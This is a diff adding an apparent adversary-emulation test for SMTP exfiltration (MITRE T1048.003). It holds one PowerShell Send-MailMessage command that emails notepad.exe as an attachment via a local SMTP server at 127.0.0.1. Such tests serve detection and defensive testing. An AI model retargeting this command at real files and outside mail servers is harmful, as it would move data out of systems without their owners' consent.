@@ -1,0 +1,8 @@
+#TechniqueName: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+#AtomicTestName: Exfiltration Over Alternative Protocol - SMTP
+#Description: Exfiltration of specified file over SMTP.&Upon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.&
+#Language: ps1
+
+#commands
+Send-MailMessage -From test@corp.com -To test@corp.com -Subject "T1048.003 Atomic Test" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1
+
